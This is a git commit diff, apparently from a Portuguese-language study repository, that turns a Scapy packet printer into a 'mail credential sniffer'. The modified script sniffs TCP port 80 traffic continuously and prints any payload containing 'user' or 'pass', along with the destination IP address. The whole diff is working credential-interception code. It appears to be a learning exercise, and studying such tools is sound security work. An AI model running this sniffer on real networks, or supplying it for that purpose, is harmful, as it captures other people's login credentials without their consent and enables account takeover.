0e6a78dfbca529693b1869ee22f72b1bc663b4f8
caioescorcio <caioeldourado@gmail.com>
2024-12-29 10:21:24 -0300

    💾 C4/ mail credential sniffer

--- c4/codigos/mail_sniffer.py
+++ c4/codigos/mail_sniffer.py
@@ -1,10 +1,15 @@
-from scapy.all import sniff
+from scapy.all import sniff, TCP, IP
 
 def packet_callback(packet):
-    print(packet.show())
+    if packet[TCP].payload:
+        mypacket = str(packet[TCP].payload)
+        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
+            print(f'[*] Destino: {packet[IP].dst}')
+            print(f'[*] {mypacket}')
     
 def main():
-    sniff(prn=packet_callback, count=1)
+    sniff(filter='tcp port 80',
+          prn=packet_callback, store=0)
 
 if __name__ == '__main__':
     main()
